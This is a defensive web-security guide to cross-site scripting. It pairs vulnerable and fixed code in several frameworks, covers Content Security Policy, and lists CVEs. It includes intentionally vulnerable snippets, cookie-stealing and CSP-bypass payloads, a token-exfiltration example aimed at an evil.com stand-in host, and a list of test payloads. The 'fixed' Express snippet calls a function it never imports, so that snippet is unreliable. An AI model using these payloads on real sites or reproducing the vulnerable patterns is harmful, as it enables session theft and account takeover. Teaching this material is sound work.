# Cross-Site Scripting (XSS) — Reflected, Stored, DOM-based, CSP Bypass

**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
**OWASP Top 10:2021:** A03 — Injection (XSS is the #1 most prevalent injection type)
**CWE Top 25 2024:** #1 (XSS — moved up from #2, with 3 CVEs in KEV)

---

## What Is XSS?

Cross-Site Scripting (XSS) is a vulnerability where an attacker injects **malicious client-side scripts** into web pages viewed by other users. The injected code runs in the victim's browser **in the context of the trusted application**, allowing the attacker to:

- Steal session cookies and authentication tokens
- Redirect users to phishing sites
- Deface web pages
- Log keystrokes
- Execute actions on behalf of the victim
- Install malware via drive-by downloads

**The root cause:** User-supplied data is included in web page output without proper **context-aware encoding** or sanitization.

## Why Vibe Coding Makes This Worse

AI code generators frequently produce XSS-vulnerable code because:

- **AI defaults to inline HTML rendering:** React's `dangerouslySetInnerHTML`, Vue's `v-html`, and raw `innerHTML` assignments are common AI outputs
- **Template engines without auto-escaping:** AI may generate Handlebars/ERB templates without `{{{{ }}}}` escaping
- **Forgotten output encoding:** AI focuses on data flow but misses the encoding step at the output boundary
- **CSP headers omitted:** Security headers are "overhead" the AI skips unless explicitly prompted
- **`eval()` for convenience:** Dynamic code execution in responses

---

## Types of XSS

### 1. Reflected XSS (Non-Persistent)

The injected script is **part of the request** (URL parameter, form input) and reflected immediately in the response. Requires social engineering (victim clicks a crafted link).

**Vulnerable Code — Python (Flask)**
```python
from flask import Flask, request

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # 🔴 VULNERABLE: query rendered directly in HTML
    return f'<html><body>Search results for: <b>{query}</b></body></html>'
# Attack: /search?q=<script>alert(document.cookie)</script>
```

**Vulnerable Code — Node.js (Express)**
```javascript
app.get('/search', (req, res) => {
    const query = req.query.q || '';
    // 🔴 VULNERABLE
    res.send(`<html><body>Search results for: <b>${query}</b></body></html>`);
});
```

**Fixed Code — Python (Flask)**
```python
from flask import Flask, request, escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # ✅ SAFE: HTML-escape user input
    return f'<html><body>Search results for: <b>{escape(query)}</b></body></html>'
```

**Fixed Code — Node.js (Express)**
```javascript
const { escape } = require('html-escaper');
// or: const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
    const query = req.query.q || '';
    // ✅ SAFE: HTML-escape output
    res.send(`<html><body>Search results for: <b>${escapeHtml(query)}</b></body></html>`);
});
```

### 2. Stored XSS (Persistent)

The injected script is **stored on the server** (database, message board, comments, profile fields) and served to every user who views that content. More dangerous because no phishing is required.

**Vulnerable Code — React**
```jsx
function CommentSection({ comments }) {
    return (
        <div>
            {comments.map(comment => (
                <div key={comment.id}>
                    <h3>{comment.author}</h3>
                    {/* 🔴 VULNERABLE: dangerouslySetInnerHTML */}
                    <p dangerouslySetInnerHTML={{ __html: comment.body }} />
                </div>
            ))}
        </div>
    );
}
```

**Fixed Code — React**
```jsx
function CommentSection({ comments }) {
    return (
        <div>
            {comments.map(comment => (
                <div key={comment.id}>
                    <h3>{comment.author}</h3>
                    {/* ✅ SAFE: React escapes by default */}
                    <p>{comment.body}</p>
                </div>
            ))}
        </div>
    );
}
```

**Backend Fix — Node.js (Express)**
```javascript
// Before saving: sanitize input (server-side validation)
const sanitizeHtml = require('sanitize-html');

app.post('/comment', (req, res) => {
    const clean = sanitizeHtml(req.body.comment, {
        allowedTags: ['b', 'i', 'em', 'strong', 'a'],
        allowedAttributes: { 'a': ['href'] }
    });
    // Save clean to database
});
```

### 3. DOM-Based XSS

The vulnerability exists entirely in **client-side JavaScript**. The page loads safely from the server, but the JS reads attacker-controlled data from the URL hash, `document.referrer`, `window.name`, or `postMessage` and writes it to the DOM unsafely.

**Vulnerable Code**
```javascript
// 🔴 VULNERABLE: reading from URL and writing to DOM
const tab = new URLSearchParams(window.location.search).get('tab');
document.getElementById('content').innerHTML = `Showing: ${tab}`;

// Attack: /page.html?tab=<img src=x onerror=alert(document.cookie)>
```

**Fixed Code**
```javascript
// ✅ SAFE: use textContent instead of innerHTML
const tab = new URLSearchParams(window.location.search).get('tab');
document.getElementById('content').textContent = `Showing: ${tab}`;

// ✅ SAFE: or use a safe DOM API
const content = document.getElementById('content');
content.innerText = `Showing: ${tab}`;
```

**Vulnerable — Vue.js**
```vue
<template>
  <!-- 🔴 VULNERABLE: v-html renders raw HTML -->
  <div v-html="userComment"></div>
</template>
```

**Fixed — Vue.js**
```vue
<template>
  <!-- ✅ SAFE: Vue's {{ }} escaping is automatic -->
  <div>{{ userComment }}</div>
</template>
```

---

## Content Security Policy (CSP)

**CSP is your second line of defense** — it limits what scripts can execute even if an XSS payload is injected.

### Weak CSP (Easily Bypassed)
```http
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com
```
This is practically useless — `'unsafe-inline'` allows inline scripts, `'unsafe-eval'` allows `eval()`.

### Strong CSP
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none';
```

### Nonce-Based CSP (Recommended)
```http
Content-Security-Policy: script-src 'self' 'nonce-{random}' 'strict-dynamic'
```
```javascript
// Server generates a unique nonce per request
app.use((req, res, next) => {
    res.locals.nonce = crypto.randomBytes(16).toString('hex');
    res.setHeader('Content-Security-Policy',
        `script-src 'nonce-${res.locals.nonce}'`);
    next();
});
```

### CSP Bypass Vectors Watch Out For

- **JSONP endpoints:** `?callback=alert(1)` on trusted CDNs
- **File upload:** Uploading `.js` files to `self`-allowed origins
- **Angular/React clone nodes:** `{{constructor.constructor('alert(1)')()}}`
- **Dangling markup injection:** Stealing tokens via `<img src="https://evil.com/steal?`

---

## XSS Contexts & Escaping

Different HTML contexts require **different escaping**:

| Context | Encoding | Example |
|---|---|---|
| HTML body content | HTML entity encode (`&lt;`, `&gt;`) | `escape()` in Python, `escapeHtml()` in JS |
| HTML attributes | Attribute encode (`"` → `&quot;`, `'` → `&#x27;`) | Must quote attrs and escape quotes |
| JavaScript string | Unicode escape (`\x3C`, `\u003C`) | Never put untrusted data in JS |
| URL parameter | URL encode (`%3C`) | `encodeURIComponent()` |
| CSS | CSS escape (`\3C`) | Avoid untrusted data in CSS entirely |

---

## Prevention Checklist for AI Prompts

```
✅ XSS PREVENTION FOR THIS CODE:
- Use context-aware output encoding for ALL user-controlled data
- NEVER use innerHTML, dangerouslySetInnerHTML, v-html, or similar APIs
- Use textContent, innerText, or framework's automatic escaping
- Set strict Content-Security-Policy headers (nonce-based)
- Sanitize HTML on the server side before storing (allowlist approach)
- Validate input type and length on both client and server
- Use DOMPurify if HTML rendering is absolutely required
- Set HttpOnly and Secure flags on session cookies
- Never put untrusted data in <script>, <style>, or event handler attributes
- X-XSS-Protection: 0 (modern browsers disable XSS auditor; rely on CSP)
```

### Quick Decision Tree

```
User data goes into output?
├── HTML body → HTML-entity encode
├── HTML attribute → Attribute encode + quote wrapping
├── <script> / JS string → NEVER put untrusted data here
├── URL parameter → URL encode
├── CSS value → Avoid entirely
└── Safe (React/Vue/Svelte JSX/template) → Framework auto-escapes, but watch for v-html/dangerouslySetInnerHTML
```

---

## Real-World CVEs

| Vulnerability | CVE | Impact |
|---|---|---|
| Stored XSS in WordPress Core Avatar block (user display name) | CVE-2024-4439 | Unauthenticated injection via comment-author avatar; session/account takeover (WP < 6.5.2) |
| Reflected XSS in WordPress Advanced Custom Fields plugin | CVE-2023-30777 | Unauthenticated `post_status` reflection hijacks admin sessions (2M+ sites, ACF ≤ 6.1.5) |
| Stored XSS in Grafana Unified Alerting | CVE-2022-31097 | Injected script escalates an editor to admin when an admin views it |
| DOM XSS via jQuery DOM-manipulation methods (`.html()`, `.append()`) | CVE-2020-11022 | Untrusted HTML executes even after sanitization (jQuery ≥ 1.12.0, < 3.5.0) |
| Stored XSS in CKEditor 4 HTML processing (WYSIWYG) | CVE-2022-24728 | Malformed HTML bypasses the sanitizer, running arbitrary JS in the editor context (< 4.18.0) |
| Stored XSS in Live Helper Chat | CVE-2022-1234 | Page defacement, account compromise, malicious code execution (< 3.97) |

---

## Testing for XSS

**Manual testing payloads:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><img src=x onerror=alert(1)>
javascript:alert(1)
<svg/onload=alert(1)>
'"><img src=x onerror=alert(1)>
```

**Automated tools:**
- [XSStrike](https://github.com/s0md3v/XSStrike) — Advanced XSS detection
- [DOMPurify](https://github.com/cure53/DOMPurify) — HTML sanitizer library
- Browser DevTools — Network tab to inspect response payloads

---

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
